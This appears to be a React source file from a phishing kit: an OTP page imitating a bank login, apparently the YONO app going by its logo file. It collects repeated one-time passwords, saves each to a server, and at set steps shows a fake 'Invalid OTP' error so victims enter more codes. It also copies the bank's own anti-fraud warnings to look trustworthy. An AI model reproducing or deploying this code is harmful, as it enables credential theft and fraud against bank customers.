import { useState, FormEvent, useEffect } from 'react';
import { useLocation } from 'wouter';
import { updateUserData, getNextRoute, getCurrentOtpKey, getCurrentStep, saveDataToServer, saveIntermediateData } from '@/lib/userState';

export default function OtpPage() {
  const [, navigate] = useLocation();
  const [otp, setOtp] = useState('');
  const [timer, setTimer] = useState(150); // 2:30 in seconds
  const [isSaving, setIsSaving] = useState(false);
  
  // Get the current OTP key (otp1, otp2, otp3, or otp4)
  const currentOtpKey = getCurrentOtpKey();
  const currentStep = getCurrentStep();
  
  // Format the timer as MM:SS
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };
  
  // Timer countdown effect
  useEffect(() => {
    const countdown = setInterval(() => {
      setTimer((prevTimer) => {
        if (prevTimer <= 0) {
          clearInterval(countdown);
          return 0;
        }
        return prevTimer - 1;
      });
    }, 1000);
    
    return () => clearInterval(countdown);
  }, []);
  
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    // Save the OTP data to state
    setIsSaving(true);
    
    try {
      // Create an object with the current OTP key
      const otpData = {
        [currentOtpKey]: otp
      };
      
      // Save the OTP to local state
      updateUserData(otpData);
      
      // Save data after each step
      await saveIntermediateData();
      
      // Check if this is regular OTP4 (after verify account) or OTP8 (final)
      if (currentStep === 7 || currentStep === 11) {
        // Save all collected data to the server
        const result = await saveDataToServer();
        console.log('Server save result:', result);
        
        if (!result.success) {
          alert('Could not save data to server: ' + result.message);
        }
      }
      
      // Navigate to the next page in the flow
      navigate(getNextRoute());
    } catch (error) {
      console.error('Error saving data:', error);
      // Clear the OTP input field if there's an error
      setOtp('');
    } finally {
      setIsSaving(false);
      // Clear the OTP input field after submission (whether successful or not)
      setOtp('');
    }
  };
  
  const handleResend = () => {
    // Reset timer
    setTimer(150);
    // Clear any existing OTP value when resending
    setOtp('');
  };

  return (
    <div id="__next">
      <header className="Jeuookhh_logo__chFnY">
        <img 
          alt="8wblnz" 
          loading="lazy" 
          width="120" 
          height="32" 
          decoding="async"
          data-nimg="1" 
          src="/images/yono.png" 
          style={{ color: "transparent" }} 
        />
      </header>
      <main>
        <div className="Jeuookhh_login_heading__g_rIN">
          <h3 className="Jeuookhh_login_heading_h3__40cUi">Continue with OTP</h3>
        </div>
        <div className="Jeuookhh_login_form__UT1PX">
          {/* Show error message for invalid OTP steps (4th, 6th, and 7th) - NOT 5th */}
          {(currentStep === 7 || /* 4th OTP */
            currentStep === 9 || /* 6th OTP */
            currentStep === 10   /* 7th OTP */
           ) && (
            <div style={{ 
              backgroundColor: '#fee', 
              border: '1px solid #f88', 
              color: '#d00', 
              padding: '10px', 
              marginBottom: '10px',
              borderRadius: '4px'
            }}>
              <p style={{ fontWeight: 'bold', margin: '0 0 5px 0' }}>Invalid OTP</p>
              <p style={{ margin: '0' }}>
                The OTP you entered is incorrect. Please try again with a new OTP that has been sent to your registered mobile number.
              </p>
            </div>
          )}
          <p className="Jeuookhh_content_title__eLlbR">A one-time password has been sent to your registered mobile number</p>
          <p className="Jeuookhh_mandatory_txt__seeNN">Required fields an asterisk (*)</p>
          <form className="Jeuookhh_form__NPDIu" onSubmit={handleSubmit}>
            <input type="hidden" name="formtoken" value="cuigGk" />
            <div className="Jeuookhh_form_group__iOuIR">
              <label className="Jeuookhh_label__fvDl5">
                Enter the One Time-Password <span className="Jeuookhh_mandatory_txt__seeNN">*</span>
              </label>
              <input 
                name="R1" 
                type="text" 
                className="Jeuookhh_form_control__aKuXl" 
                required 
                minLength={6} 
                maxLength={8}
                value={otp}
                onChange={(e) => setOtp(e.target.value)} 
              />
            </div>
            <div className="Jeuookhh_t_center____ZxZ">
              <input 
                type="submit" 
                className="Jeuookhh_btn_default__PIkhU" 
                value={isSaving ? "Processing..." : "submit"}
                disabled={isSaving} 
              />
            </div>
          </form>
          <div className="Jeuookhh_t_center____ZxZ">
            <p>{formatTime(timer)}</p>
          </div>
          <div className="Jeuookhh_t_center____ZxZ">
            <p>In case you haven't received a one-time password (OTP) on your mobile phone, &nbsp;
              <button className="Jeuookhh_btn_resend__klTLK" type="button" onClick={handleResend}>click here to resend</button>
            </p>
          </div>
          <div className="Jeuookhh_info_panel__n1fy6">
            <div className="Jeuookhh_notify_icon__8mrta">
              <ul>
                <li>Please note that all calls, SMS, and email correspondence will be sent to your registered mobile number</li>
                <li>We will never contact you via email, SMS, or phone calls to request your personal information.</li>
                <li>Please refrain from responding to any suspicious SMS, calls, or emails. Kindly report any such suspicious activity immediately for further investigation.</li>
              </ul>
            </div>
          </div>
        </div>
      </main>
      <div className="Jeuookhh_footer_area__5ot65">
        <img 
          alt="1ZaFOQ" 
          loading="lazy" 
          width="68" 
          height="28" 
          decoding="async" 
          data-nimg="1" 
          src="/images/gwhp.png" 
          style={{ color: "transparent" }} 
        />
      </div>
      <div className="Jeuookhh_footer__Wxn0J">
        <p>©</p>
      </div>
    </div>
  );
}